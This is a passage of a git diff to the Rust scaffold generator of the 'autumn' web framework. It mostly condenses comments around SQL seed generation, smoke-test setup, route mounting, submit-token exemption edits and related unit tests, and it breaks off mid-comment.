     let sqlite = backend == DatabaseBackend::Sqlite;
     match f.kind {
-        // A slug field is always `unique` (issue #1260) -- it MUST vary per
-        // row here, or the seeded rows collide on the very first re-insert.
+        // A slug is always `unique` (#1260), so it must vary per row.
         FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug => {
             "'sample-' || g".to_owned()
         }
@@ -14845,17 +13121,14 @@ fn sql_seed_value_expr(backend: DatabaseBackend, f: &Field) -> String {
         FieldKind::NaiveDateTime | FieldKind::DateTime => {
             "NOW() + (g || ' seconds')::interval".to_owned()
         }
-        // Vary a time per row too (issue #3405), so a `unique` time column
-        // does not collide.
+        // Vary per row (#3405) so a `unique` time column does not collide.
         FieldKind::Time if sqlite => "time('00:00:00', '+' || g || ' seconds')".to_owned(),
         FieldKind::Time => "TIME '00:00:00' + (g || ' seconds')::interval".to_owned(),
         // Enum must stay inside its declared set — pick a real variant.
         FieldKind::Enum => {
             format!("'{}'", f.variants.first().expect("enum field has variants"))
         }
-        // A constant `'{}'::jsonb` for every row (issue #1341 review) would
-        // collide on the very first re-insert for a `unique` json column —
-        // vary it with `g`, same as the text/numeric arms above.
+        // Vary with `g`: a constant `'{}'` would collide on a `unique` json column.
         FieldKind::Json if sqlite => "'{\"seed\": ' || g || '}'".to_owned(),
         FieldKind::Json => "('{\"seed\": ' || g || '}')::jsonb".to_owned(),
         _ => sql_sample_literal(backend, f.kind),
@@ -14898,9 +13171,7 @@ fn render_api_seed_sql(
     }
     let n = API_SMOKE_TEST_SEED_ROWS;
     if columns.is_empty() {
-        // N all-default rows, one valid `DEFAULT VALUES` insert each. The
-        // smoke test's setup path (`render_execute_sql_calls`) splits these
-        // into one `db.execute_sql(...)` call per statement.
+        // `render_execute_sql_calls` splits these into one `execute_sql` call per statement.
         vec![format!("INSERT INTO {plural} DEFAULT VALUES"); n].join(";\n")
     } else {
         let (with, source) = match backend {
@@ -14940,11 +13211,8 @@ fn enum_rejection_insert_sql(
             values.push("'__not_a_real_variant__'".to_owned());
         } else if !f.nullable && !defaults.contains_key(&f.name) {
             columns.push(f.name.clone());
-            // A scaffold can have more than one required enum column; the
-            // generic `sql_sample_literal` fallback ("'sample'") isn't a
-            // real variant of any *other* enum field's own closed set, which
-            // would trip that field's CHECK too and muddy which column's
-            // constraint actually failed.
+            // Another required enum column needs a real variant: `'sample'` would trip its
+            // CHECK too and hide which constraint failed.
             let value = if f.is_enum() {
                 format!("'{}'", f.variants.first().expect("enum field has variants"))
             } else {
@@ -14984,16 +13252,10 @@ fn render_enum_rejection_smoke_test(
     let reset_call = smoke_reset_call(backend, plural);
     let db_ctor = smoke_db_ctor(backend);
     let ignore_attr = smoke_ignore_attr(backend);
-    // `setup_calls` is shared with, and identical to, the base index/api smoke test's own
-    // setup, which issues a plain, non-idempotent `CREATE TABLE {plural} (...)` and, for
-    // any `--index`/`references` field, a plain `CREATE INDEX idx_{plural}_{field} ...`
-    // matching the real migration. Both tests run against the same `TestDb::shared()`
-    // Postgres container in the same test binary, so whichever ran second would hit
-    // "relation already exists". Make this test's own copies of both statement kinds
-    // idempotent, so it works alongside the base test or standalone. The reference-stub
-    // `CREATE TABLE`s are already `IF NOT EXISTS` (see `render_reference_stub_tables_sql`),
-    // so only the main table's statement needs the same treatment; `CREATE INDEX` has no
-    // per-index counterpart, so every occurrence is rewritten.
+    // The base smoke test runs the same `setup_calls` against the same `TestDb::shared()`,
+    // and its plain `CREATE TABLE {plural}` / `CREATE INDEX idx_…` would fail with "relation
+    // already exists" in whichever test runs second. Make the main table and every index
+    // idempotent here; the reference stubs already use `IF NOT EXISTS`.
     let setup_calls = setup_calls.replacen(
         &format!("CREATE TABLE {plural} ("),
         &format!("CREATE TABLE IF NOT EXISTS {plural} ("),
@@ -15079,24 +13341,16 @@ fn unique_sample_literal(backend: DatabaseBackend, kind: FieldKind) -> String {
         | FieldKind::RichText
         | FieldKind::Enum
         | FieldKind::Slug => "'dup_value'".to_owned(),
-        // `position`/`commentable` can never be `:unique` (both rejected in
-        // `parse_field`), so these arms are unreachable in practice — listed
-        // for exhaustiveness with the same literal as `I32`/`I64`.
+        // `parse_field` rejects `:unique` on `position`/`commentable`; listed for exhaustiveness.
         FieldKind::I32 | FieldKind::I64 | FieldKind::Position | FieldKind::Commentable => {
             "424242".to_owned()
         }
-        // Must be a real seeded row's id, not an arbitrary literal — a
-        // `references` target column is FK-constrained against the stub
-        // table `render_reference_stub_tables_sql` seeds exactly one row
-        // (id 1) into. An arbitrary id like `424242` would fail on the FK
-        // constraint before the insert ever reaches the UNIQUE index this
-        // test exists to exercise. Matches `sql_sample_literal`'s existing
-        // convention for the same reason.
+        // A stub row seeded by `render_reference_stub_tables_sql`: any other id fails the FK
+        // before the insert reaches the UNIQUE index under test.
         FieldKind::References => "1".to_owned(),
         FieldKind::Bool => "TRUE".to_owned(),
         FieldKind::F32 | FieldKind::F64 => "1.5".to_owned(),
-        // Scale-derived, distinct from `sql_sample_literal`'s digit-1 value
-        // for the same field — see `decimal_literal_at_scale`.
+        // Scale-derived, distinct from `sql_sample_literal`'s digit-1 value.
         FieldKind::Decimal { scale, .. } => decimal_literal_at_scale(scale, 2),
         FieldKind::Uuid if sqlite => "'00000000-0000-0000-0000-000000000001'".to_owned(),
         FieldKind::Uuid => "'00000000-0000-0000-0000-000000000001'::uuid".to_owned(),
@@ -15130,21 +13384,15 @@ fn unique_sample_literal_variant(backend: DatabaseBackend, kind: FieldKind) -> S
         | FieldKind::RichText
         | FieldKind::Enum
         | FieldKind::Slug => "'dup_value_2'".to_owned(),
-        // `position` can never be `:unique` (rejected in `parse_field`), so
-        // this arm is unreachable in practice — listed for exhaustiveness
-        // with the same literal as `I32`/`I64`.
+        // `parse_field` rejects `:unique` on `position`/`commentable`; listed for exhaustiveness.
         FieldKind::I32 | FieldKind::I64 | FieldKind::Position | FieldKind::Commentable => {
             "424243".to_owned()
         }
-        // The second stub row `render_reference_stub_tables_sql` seeds —
-        // distinct from `unique_sample_literal`'s "1" for the same reason
-        // that one must be a real seeded row's id, not an arbitrary literal.
+        // The second stub row `render_reference_stub_tables_sql` seeds; the FK needs a real id.
         FieldKind::References => "2".to_owned(),
         FieldKind::Bool => "FALSE".to_owned(),
         FieldKind::F32 | FieldKind::F64 => "2.5".to_owned(),
-        // Scale-derived, distinct from both `sql_sample_literal`'s digit-1
-        // and `unique_sample_literal`'s digit-2 value — see
-        // `decimal_literal_at_scale`.
+        // Scale-derived, distinct from the digit-1 and digit-2 values of the other helpers.
         FieldKind::Decimal { scale, .. } => decimal_literal_at_scale(scale, 3),
         FieldKind::Uuid if sqlite => "'00000000-0000-0000-0000-000000000002'".to_owned(),
         FieldKind::Uuid => "'00000000-0000-0000-0000-000000000002'::uuid".to_owned(),
@@ -15252,10 +13500,8 @@ fn render_unique_violation_smoke_test(
     let db_ctor = smoke_db_ctor(backend);
     let db_label = smoke_db_label(backend);
     let ignore_attr = smoke_ignore_attr(backend);
-    // Same idempotency treatment as `render_enum_rejection_smoke_test` (see
-    // its comment) — this test's own setup must tolerate running alongside
-    // the base index/api smoke test and/or the enum-rejection smoke test in
-    // the same `TestDb::shared()` container.
+    // Idempotent setup, as in `render_enum_rejection_smoke_test`: the base and enum-rejection
+    // tests create the same table and indexes in the same `TestDb::shared()`.
     let setup_calls = setup_calls.replacen(
         &format!("CREATE TABLE {plural} ("),
         &format!("CREATE TABLE IF NOT EXISTS {plural} ("),
@@ -15270,10 +13516,8 @@ fn render_unique_violation_smoke_test(
 
     let mut out = String::new();
     for target in unique_fields {
-        // A unique constraint on an always-`Option`-wrapped attachment blob
-        // is a degenerate case (Postgres permits unlimited `NULL`s under a
-        // unique index, so there's no violation to provoke) — skip it here,
-        // same as `unique`'s handling elsewhere never claims to cover it.
+        // An attachment is always nullable, and a unique index admits any number of `NULL`s,
+        // so there is no violation to provoke.
         if target.kind.is_attachment() {
             continue;
         }
@@ -15281,16 +13525,9 @@ fn render_unique_violation_smoke_test(
         let insert_sql =
             unique_violation_insert_sql(backend, plural, fields, target, defaults, false);
         let escaped_insert = escape_sql_for_rust_literal(&insert_sql);
-        // A scaffold with more than one `unique` field needs a *second*,
-        // distinct insert for the DB-level duplicate-insert check below: if
-        // it reused `escaped_insert` verbatim, a non-target unique column
-        // would collide with itself too, racing against `target`'s own
-        // collision to decide which violation Postgres actually reports
-        // (issue #1032 review follow-up). Only that DB-level check gets the
-        // varied insert — the request-boundary stand-in handler below is a
-        // single compiled function invoked via two separate HTTP calls, so
-        // it has no way to distinguish "first call" from "second call" and
-        // keeps using `escaped_insert` for both, same as before.
+        // The DB-level duplicate insert varies every non-target unique column, so only
+        // `target` collides and Postgres reports its violation (#1032). The request-boundary
+        // stand-in is one handler called twice, so it keeps `escaped_insert` for both calls.
         let insert_sql_dup =
             unique_violation_insert_sql(backend, plural, fields, target, defaults, true);
         let escaped_insert_dup = escape_sql_for_rust_literal(&insert_sql_dup);
@@ -15391,20 +13628,16 @@ fn main_route_entries(
     search: bool,
     bulk_delete: bool,
     export_csv: bool,
-    // Issue #1393: `true` under `--import`, mounting the CSV upload form and the
-    // handler that previews or commits it.
+    // #1393: `--import` mounts the CSV upload form and its preview/commit handler.
     import_csv: bool,
-    // Issue #1332: `true` under `--soft-delete` on the standard HTML path,
-    // mounting the trash view and its restore/purge controls.
+    // #1332: `--soft-delete` (HTML) mounts the trash view and its restore/purge controls.
     trash: bool,
-    // Issue #1358: `true` when the model has a `position` field on the
-    // standard HTML path, mounting the two `move_up`/`move_down` controls.
+    // #1358: a `position` field (HTML) mounts `move_up`/`move_down`.
     reorder: bool,
     validated_field_names: &[String],
     sm_field_names: &[String],
     rich_text_field_names: &[String],
-    // Issue #1323: `true` under `--belongs-to`, mounting the two nested
-    // handlers the routes module emits alongside the flat seven.
+    // #1323: `--belongs-to` mounts the two nested handlers beside the flat seven.
     nested: bool,
 ) -> Vec<String> {
     if api {
@@ -15429,38 +13662,28 @@ fn main_route_entries(
             format!("routes::{plural}::update"),
             format!("routes::{plural}::destroy"),
         ];
-        // Issue #1312: mount the bulk delete-selected route immediately after the
-        // per-row `destroy` it generalises. Gated with the handler emission in
-        // `render_routes_file` — mounting a route the module never emitted would
-        // fail the generated app to compile.
+        // Each optional route below is gated exactly like its handler in `render_routes_file`:
+        // mounting a handler the module never emitted fails the generated app's build.
+        // #1312: bulk delete, right after the per-row `destroy`.
         if bulk_delete {
             entries.push(format!("routes::{plural}::bulk_delete"));
         }
-        // Issue #1315: mount the CSV export next to the index it exports. Gated
-        // with the handler emission in `render_routes_file` for the same reason
-        // as `bulk_delete` above.
+        // #1315: CSV export.
         if export_csv {
             entries.push(format!("routes::{plural}::export_csv"));
         }
-        // Issue #1393: mount the import pair next to the export it mirrors.
-        // Gated with the handler emission in `render_routes_file` for the same
-        // reason as `bulk_delete`/`export_csv` above.
+        // #1393: CSV import form and handler.
         if import_csv {
             entries.push(format!("routes::{plural}::import_form"));
             entries.push(format!("routes::{plural}::import"));
         }
-        // Issue #1332: mount the trash view next to the index it recovers from,
-        // then its two per-row controls. Gated with the handler emission in
-        // `render_routes_file` for the same reason as `bulk_delete` above —
-        // mounting a route the module never emitted would fail the generated app
-        // to compile.
+        // #1332: the trash view and its per-row restore/purge controls.
         if trash {
             entries.push(format!("routes::{plural}::trash"));
             entries.push(format!("routes::{plural}::restore"));
             entries.push(format!("routes::{plural}::purge"));
         }
-        // Issue #1358: mount the reorder controls next to `destroy`, same
-        // reasoning as `bulk_delete`/`trash` above.
+        // #1358: reorder controls.
         if reorder {
             entries.push(format!("routes::{plural}::move_up"));
             entries.push(format!("routes::{plural}::move_down"));
@@ -15468,33 +13691,23 @@ fn main_route_entries(
         if live {
             entries.push(format!("routes::{plural}::events"));
         }
-        // Issue #1319: register the FTS results route (non-live only; the box is
-        // gated off for live variants — see `render_routes_file`).
+        // #1319: full-text search results (never set for live variants).
         if search {
             entries.push(format!("routes::{plural}::search"));
         }
         for field_name in validated_field_names {
             entries.push(format!("routes::{plural}::validate_{field_name}"));
         }
-        // Issue #1326: mount the `POST /{plural}/{{id}}/transitions/{field}`
-        // handler emitted for each state-machine field, so the show page's
-        // `transition_controls` form actions resolve to a real route rather than
-        // 404ing. A scaffold with no state-machine field pushes nothing here and
-        // keeps the pre-#1326 mounted route set byte-identical.
+        // #1326: one transition handler per state-machine field, the target of the show page's
+        // `transition_controls` forms.
         for field_name in sm_field_names {
             entries.push(format!("routes::{plural}::transition_{field_name}"));
         }
-        // Issue #1255: mount the `POST /{plural}/preview/{field}` fragment
-        // handler emitted for each `richtext` column, so the editor's htmx live
-        // preview resolves to a real route rather than 404ing. A scaffold with
-        // no rich-text column pushes nothing here and keeps the mounted route
-        // set byte-identical.
+        // #1255: one live-preview fragment handler per `richtext` column.
         for field_name in rich_text_field_names {
             entries.push(format!("routes::{plural}::preview_{field_name}"));
         }
-        // Issue #1323: the nested read/create pair. Gated with the handler
-        // emission in `render_routes_file` — mounting a route the module never
-        // emitted would fail the generated app to compile.
+        // #1323: the nested read/create pair.
         if nested {
             entries.push(format!("routes::{plural}::nested_index"));
             entries.push(format!("routes::{plural}::nested_create"));
@@ -15565,15 +13778,12 @@ fn append_submit_token_exempt_to_toml(
 
     let exempt = submit_token_exempt_prefix(plural, segment);
 
-    // Parse format-preservingly so comments, ordering, and hand-crafted array
-    // layout survive the edit. A config we can't parse is left untouched (and we
-    // claim no ownership) rather than risking corruption via raw string edits.
+    // `toml_edit` keeps comments, ordering and array layout. An unparseable config is left
+    // untouched and unowned rather than edited as raw text.
     let mut doc = existing.parse::<DocumentMut>().ok()?;
 
-    // Navigate to — creating if absent — `[security.submit_token]`. A freshly
-    // created `[security]` parent is marked implicit so it renders as the dotted
-    // `[security.submit_token]` header (matching the hand-written convention)
-    // rather than emitting a bare, empty `[security]` table of its own.
+    // A newly created `[security]` is implicit, so only the dotted `[security.submit_token]`
+    // header renders, not an empty `[security]` table.
     let security_missing = !doc.as_table().contains_key("security");
     let security = doc
         .as_table_mut()
@@ -15588,15 +13798,12 @@ fn append_submit_token_exempt_to_toml(
         .or_insert_with(|| Item::Table(Table::new()))
         .as_table_mut()?;
 
-    // Get or create the `exempt_paths` array.
     let array = submit_token
         .entry("exempt_paths")
         .or_insert_with(|| Item::Value(Value::Array(Array::new())))
         .as_array_mut()?;
 
-    // Idempotent: if the prefix is already listed, return `None` so we don't
-    // claim ownership of (and later, on `autumn destroy`, delete) a preexisting,
-    // user-owned exemption.
+    // Already listed: return `None` so `autumn destroy` never deletes a user-owned exemption.
     if array.iter().any(|v| v.as_str() == Some(exempt.as_str())) {
         return None;
     }
@@ -15644,7 +13851,6 @@ pub(super) fn remove_submit_token_exempt_from_toml(
     if !inner.contains(&quoted) {
         return existing.to_owned();
     }
-    // Strip our element from the array's comma-separated items.
     let remaining: Vec<String> = inner
         .split(',')
         .map(str::trim)
@@ -15654,8 +13860,7 @@ pub(super) fn remove_submit_token_exempt_from_toml(
 
     let mut out_lines: Vec<String> = lines.iter().map(|l| (*l).to_owned()).collect();
     if remaining.is_empty() {
-        // The block only carried our exempt_paths line — remove the key, and the
-        // whole table too if the key was its sole content.
+        // Remove the key, and the whole table if the key was its only content.
         let block_only_our_key = (start + 1..end).all(|i| {
             i == key_idx || (key_idx..=close_idx).contains(&i) || lines[i].trim().is_empty()
         });
@@ -15675,7 +13880,7 @@ pub(super) fn remove_submit_token_exempt_from_toml(
     }
 
     let mut out = out_lines.join("\n");
-    // Collapse any doubled blank lines left by removing the block.
+    // Collapse blank lines doubled by removing the block.
     while out.contains("\n\n\n") {
         out = out.replace("\n\n\n", "\n\n");
     }
@@ -15686,9 +13891,7 @@ pub(super) fn remove_submit_token_exempt_from_toml(
 }
 
 #[cfg(test)]
-// Test inputs like `"slug:slug{from:title}"` / `"post:references{label:title}"`
-// are literal DSL tokens, not format strings — the `{…}` is the scaffold's
-// own constraint-modifier syntax under test.
+// Test inputs like `"slug:slug{from:title}"` are DSL tokens, not format strings.
 #[allow(clippy::literal_string_with_formatting_args)]
 mod tests {
     use super::*;
@@ -15856,10 +14059,7 @@ async fn main() {
             ],
             || {
                 let tmp = project_with_main(default_main());
-                // Mirrors `autumn new`'s real template Cargo.toml (see
-                // `templates/Cargo.toml.tmpl`): `autumn-web`/`maud`/
-                // `diesel_migrations` and a `tokio` dev-dep with `rt`+`macros`
-                // already present, since a fresh project always ships them.
+                // The dependencies `autumn new` ships (`templates/Cargo.toml.tmpl`).
                 let cargo_path = tmp.path().join("Cargo.toml");
                 fs::write(
                     &cargo_path,
@@ -15921,11 +14121,8 @@ async fn main() {
 
     #[test]
     fn plan_errors_when_main_rs_missing() {
-        // A genuinely absent `src/main.rs` (NotFound) surfaces the same
-        // actionable shared-layout Config error as a layout-less main.rs, rather
-        // than a raw Io "missing" error — it points the user at `autumn new` /
-        // `--api`. Non-NotFound io errors (e.g. PermissionDenied) still preserve
-        // their original `ErrorKind` via `GenerateError::Io`.
+        // A missing `src/main.rs` gets the same Config error as a layout-less one, pointing
+        // at `autumn new` / `--api`. Other io errors stay `GenerateError::Io`.
         let tmp = TempDir::new().unwrap();
         fs::write(tmp.path().join("Cargo.toml"), "").unwrap();
         let err = plan_scaffold(tmp.path(), "Post", &[], "20260427000000").unwrap_err();
@@ -15942,11 +14139,8 @@ async fn main() {
 
     #[test]
     fn execute_writes_form_for_helper_with_formmodel_delegation() {
-        // Issue #1135: per-column control selection (and the required /
-        // `aria-required` signal issue #1124 guarded here) now lives in the
-        // `#[model]`-derived `FormModel` descriptors — the routes file
-        // delegates `PostForm`'s fields to the model's derived impl and
-        // renders the whole form through one shared `form_for` helper.
+        // #1135: controls come from the `#[model]`-derived `FormModel` descriptors, and the
+        // whole form renders through one shared `form_for` helper.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -15979,14 +14173,9 @@ async fn main() {
 
     #[test]
     fn execute_references_column_renders_select_with_loaded_options() {
-        // Issue #1135 AC 2: "references→select". The `#[model]` derive sees a
-        // plain `i64` and emits a number input; the scaffold overrides the
-        // reference to a `Select` whose options (the referenced table's ids)
-        // are loaded by every handler that renders the form and threaded
-        // through the shared `comment_form_for` helper. The `Post` target
-        // model exists, so the promotion applies (a missing target falls
-        // back to the derived number input — see
-        // `execute_references_column_with_missing_target_falls_back_to_number_input`).
+        // #1135: the derive sees a plain `i64`; the scaffold overrides it with a `Select` of
+        // the referenced ids, loaded by every handler that renders the form. The target
+        // model exists here, so the promotion applies.
         let tmp = project_with_main(default_main());
         write_target_model(&tmp, "post", "Post");
         let plan = plan_scaffold(
@@ -15999,7 +14188,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/comments.rs")).unwrap();
-        // The helper takes the loaded options and promotes the column.
         assert!(
             routes.contains("post_id_options: &[(String, String)],"),
             "helper must take the reference options: {routes}"
@@ -16016,7 +14204,6 @@ async fn main() {
             ),
             "reference column must be promoted to a Select: {routes}"
         );
-        // A shared loader queries the referenced table's ids.
         assert!(
             routes.contains(
                 "async fn post_id_select_options(db: &mut Db) -> AutumnResult<Vec<(String, String)>>"
@@ -16031,8 +14218,6 @@ async fn main() {
             routes.contains("use crate::schema::{comments, posts};"),
             "referenced table's schema module must be imported: {routes}"
         );
-        // Every rendering handler loads the options: new_form/edit_form GETs
-        // plus the create/update 422 re-render branches.
         assert_eq!(
             routes
                 .matches("let post_id_options = post_id_select_options(&mut db).await?;")
@@ -16040,12 +14225,10 @@ async fn main() {
             4,
             "new_form, edit_form, create 422, and update 422 must all load options: {routes}"
         );
-        // `new_form` gains the DB handle it previously didn't need.
         assert!(
             routes.contains("pub async fn new_form(\n    mut db: Db,"),
             "new_form must take a DB handle to load reference options: {routes}"
         );
-        // The helper call threads the options through.
         assert!(
             routes.contains(
                 "csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(), &post_id_options))"
@@ -16078,14 +14261,9 @@ async fn main() {
 
     #[test]
     fn execute_references_column_with_missing_target_falls_back_to_number_input() {
-        // Regression test (issue #1135 review): a missing reference target has
-        // always been a warning, not an error — the scaffold assumes the table
-        // exists out-of-band (or gets generated later) and its output must
-        // still compile. The references→select promotion needs the target's
-        // `src/schema.rs` entry, so with no `Post` model in the project the
-        // `post_id` column must skip the whole select pipeline (schema
-        // import, options loader, Select override, threaded options) and keep
-        // the derived numeric id input.
+        // A missing reference target is a warning, and the output must still compile. The
+        // select needs the target's `src/schema.rs` entry, so with no `Post` model `post_id`
+        // skips the whole select pipeline and keeps the derived number input.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -16117,7 +14295,6 @@ async fn main() {
             !routes.contains("post_id_options"),
             "the form helper must not take options for a missing target: {routes}"
         );
-        // Without reference selects, `new_form` keeps its no-DB signature.
         assert!(
             !routes.contains("pub async fn new_form(\n    mut db: Db,"),
             "new_form must not gain a DB handle when no options are loaded: {routes}"
@@ -16126,10 +14303,7 @@ async fn main() {
 
     #[test]
     fn execute_mixed_reference_targets_keeps_select_only_for_present_target() {
-        // One reference whose target exists (`author` → src/models/author.rs)
-        // and one whose target is missing (`post`): only the present target
-        // gets the select promotion; the missing one falls back to the
-        // derived number input and stays out of the schema import.
+        // `author` has a model and `post` does not: only `author` gets a select.
         let tmp = project_with_main(default_main());
         write_target_model(&tmp, "author", "Author");
         let plan = plan_scaffold(
@@ -16169,10 +14343,9 @@ async fn main() {
 
     #[test]
     fn commentable_scaffold_hints_an_audit_clean_comment_router_mount() {
-        // The generic comment router is a `nest`, which `autumn routes audit`
-        // cannot see into. The hint must pair it with the declaration that
-        // makes the mount enumerable, or the app it scaffolds fails its own
-        // CI audit step.
+        // `autumn routes audit` cannot see into the comment router's `nest`. The hint must
+        // pair it with the declaration that makes the mount enumerable, or the app fails
+        // its own audit.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -16196,10 +14369,8 @@ async fn main() {
 
     #[test]
     fn execute_self_referential_reference_keeps_select_without_target_model() {
-        // A self-referential column targets the scaffold's own table, whose
-        // schema entry this very command generates — it is never "missing",
-        // so the select promotion applies even though no `src/models/
-        // category.rs` exists beforehand.
+        // A self-reference targets the table this command generates, so it is never missing
+        // and keeps the select without a prior `src/models/category.rs`.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -16245,9 +14416,8 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Non-`--live` scaffolds write updates through a raw diesel column
-        // tuple, never constructing `UpdatePost` — importing it unconditionally
-        // left every non-`--live` scaffold with an unused import (Onramp).
+        // Non-`--live` updates use a raw diesel column tuple, so `UpdatePost` would be an
+        // unused import.
         assert!(routes.contains("use crate::models::post::{Post, NewPost};"));
         assert!(!routes.contains("UpdatePost"), "{routes}");
         assert!(routes.contains("#[get(\"/posts\")]"));
@@ -16263,29 +14433,21 @@ async fn main() {
         assert!(routes.contains("#[get(\"/posts/new\", name = \"new\")]"));
         assert!(routes.contains("#[post(\"/posts\")]"));
         assert!(routes.contains("#[get(\"/posts/{id}/edit\", name = \"edit\")]"));
-        // The HTML edit form posts to a regular `POST /posts/{id}/update`
-        // (browsers can't submit PUT natively); the JSON `PUT /api/posts/{id}`
-        // remains available via the auto-generated repository handler.
+        // Browsers cannot submit PUT, so the HTML edit form posts to `/posts/{id}/update`.
         assert!(routes.contains("#[post(\"/posts/{id}/update\")]"));
         assert!(routes.contains("pub async fn new_form("));
         assert!(routes.contains("layout(\"New Post\""));
         assert!(routes.contains("posts::title.eq(new.title.clone())"));
-        // `execute()` returns the affected row count — `Ok(0)` means the id
-        // didn't exist, and we must return 404 instead of redirecting as if
-        // the save succeeded. DB errors stay distinct from "not found".
+        // `Ok(0)` affected rows means the id did not exist: 404, not a redirect.
         assert!(routes.contains("if updated == 0"));
         assert!(routes.contains("AutumnError::not_found_msg"));
-        // The HTML edit form must point at the new HTML update handler, not
-        // the JSON PUT endpoint — browsers cannot submit PUT without JS. The
-        // URL is emitted through the typed path helper (issue #1133).
+        // The edit form targets the HTML update handler via the typed path helper (#1133),
+        // not the JSON PUT endpoint.
         assert!(routes.contains("paths::update(*id)"));
         assert!(!routes.contains("/api/posts/{}\""));
-        // HTML handlers use POST for update and delete (browsers can't submit
-        // PUT or DELETE natively); `#[put(` and `#[delete(` appear only in the
-        // auto-generated JSON repository handlers, not in the HTML routes file.
+        // PUT and DELETE live only in the generated JSON repository handlers.
         assert!(!routes.contains("#[put("));
         assert!(!routes.contains("#[delete("));
-        // The HTML delete route must be present and use POST (not DELETE).
         assert!(routes.contains(r#"#[post("/posts/{id}/delete", name = "delete")]"#));
     }
 
@@ -16341,7 +14503,7 @@ async fn main() {
         assert!(routes.contains("matches!(name, \"subtitle\")"), "{routes}");
     }
 
-    // ── enum field: form widgets, boundary validation, imports (issue #1030) ─
+    // ── enum fields: form widgets, boundary validation, imports (#1030) ──
 
     fn plan_and_execute_post_scaffold_with_status_enum(tmp: &TempDir) {
         let plan = plan_scaffold(
@@ -16363,12 +14525,8 @@ async fn main() {
         plan_and_execute_post_scaffold_with_status_enum(&tmp);
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Enum fields are promoted to a `Select` control via a `form_for`
-        // override (issue #1135) — the `#[model]` derive sees only an opaque
-        // Rust enum type, but the scaffold knows the variants statically and
-        // emits one `(value, label)` option per variant plus a leading
-        // placeholder. The selected option is chosen by the shipped
-        // `select_input` helper from the changeset's current value.
+        // #1135: the derive sees an opaque enum type, so the scaffold overrides it with a
+        // `Select` of its known variants plus a leading placeholder.
         assert!(
             routes.contains(
                 ".override_field(\"status\", autumn_web::form::FieldControl::Select { options: vec![(\"\".into(), \"— Select —\".into()), (\"draft\".into(), \"Draft\".into()), (\"published\".into(), \"Published\".into()), (\"archived\".into(), \"Archived\".into())] })"
@@ -16379,9 +14537,8 @@ async fn main() {
 
     #[test]
     fn scaffold_edit_form_marks_current_enum_variant_selected() {
-        // The `From<&Post>` seed maps the persisted variant to its wire token,
-        // which `select_input` then marks selected in the edit form (issue
-        // #1124 — selection lives in the framework helper, not the template).
+        // `From<&Post>` maps the stored variant to its wire token, which `select_input` marks
+        // selected (#1124).
         let tmp = project_with_main(default_main());
         plan_and_execute_post_scaffold_with_status_enum(&tmp);
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
@@ -16421,8 +14578,7 @@ async fn main() {
         plan_and_execute_post_scaffold_with_status_enum(&tmp);
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Non-`--live` (see `execute_writes_a_routes_file_referencing_model`):
-        // no `UpdatePost` import.
+        // Non-`--live`: no `UpdatePost` import.
         assert!(
             routes.contains("use crate::models::post::{Post, NewPost, Status};"),
             "got:\n{routes}"
@@ -16464,10 +14620,8 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // A `--default` field is excluded from the derived `FormModel` list
-        // (the model marks it `#[default]`), so the scaffold must not emit a
-        // select override for it either — otherwise `form_for` would carry a
-        // dangling override for a field it never renders.
+        // A `--default` field is `#[default]` and absent from the derived `FormModel` list, so
+        // a select override for it would dangle.
         assert!(
             !routes.contains(".override_field(\"status\""),
             "a --default field must be excluded from the create/edit forms: {routes}"
@@ -16493,10 +14647,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_colliding_with_routes_import_is_rejected() {
-        // `path:enum{a,b}` would generate `use crate::models::post::{…, Path}`
-        // in routes.rs alongside the file's own `use autumn_web::extract::Path;`
-        // — two different types both named `Path`, which is E0252. Verified by
-        // generating this exact scaffold and observing the duplicate import.
+        // `path:enum{a,b}` would import an enum `Path` beside the routes file's own
+        // `autumn_web::extract::Path`: E0252.
         for field_name in ["path", "page", "bytes", "flash", "db"] {
             let tmp = project_with_main(default_main());
             let err = plan_scaffold(
@@ -16515,11 +14667,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_named_to_string_is_rejected() {
-        // `to_string:enum{a,b}` pascalizes to `ToString`, imported into
-        // routes.rs; a nullable field of that type renders its edit-form
-        // value via `row.to_string.as_ref().map(ToString::to_string)`, an
-        // unqualified path expression that resolves to the enum instead of
-        // the prelude trait and fails to compile.
+        // An imported enum `ToString` shadows the prelude trait in the nullable edit-form
+        // value `row.to_string.as_ref().map(ToString::to_string)`, which then fails to compile.
         let tmp = project_with_main(default_main());
         let err = plan_scaffold(
             tmp.path(),
@@ -16533,11 +14682,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_named_changeset_is_rejected() {
-        // `changeset:enum{a,b}` pascalizes to `Changeset`, colliding with the
-        // `use autumn_web::form::{Changeset, IntoChangeset};` import every
-        // non-`--api` scaffold's routes file now carries (issue #1124) — a
-        // duplicate `Changeset`/`IntoChangeset` import fails with E0252,
-        // exactly like the pre-existing `Path`/`ToString` collisions above.
+        // The pascalized enum would collide with the routes file's
+        // `use autumn_web::form::{Changeset, IntoChangeset};` (#1124): E0252.
         for field_name in ["changeset", "into_changeset"] {
             let tmp = project_with_main(default_main());
             let err = plan_scaffold(
@@ -16556,14 +14702,9 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_field_named_submit_token_is_rejected() {
-        // `submit_token:enum{a,b}` pascalizes to `SubmitToken` and
-        // `submit_form_field:enum{a,b}` to `SubmitFormField`, colliding with the
-        // `use autumn_web::security::{…, SubmitFormField, SubmitToken};` import
-        // every non-`--api` scaffold's routes file now carries (issue #1360) — a
